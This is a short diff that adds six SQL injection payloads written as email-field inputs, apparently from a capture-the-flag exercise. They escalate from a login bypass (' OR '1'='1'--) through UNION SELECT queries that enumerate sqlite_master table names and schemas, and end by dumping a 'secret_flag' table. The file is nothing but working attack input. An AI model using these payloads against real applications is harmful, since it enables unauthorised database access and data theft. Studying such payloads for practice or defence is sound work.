@@ -1,0 +1,6 @@
+a@a.a' OR '1'='1'--
+a@a.a' union select count(*) from sqlite_master--
+a@a.com' union select count(*),1 from sqlite_master--
+a@a.com' union select group_concat(tbl_name,','),1 from sqlite_master--
+a@a.com' union select group_concat(sql,','),1 from sqlite_master--
+a@a.com' union select group_concat(key || ':' || value, ','),1 from secret_flag--
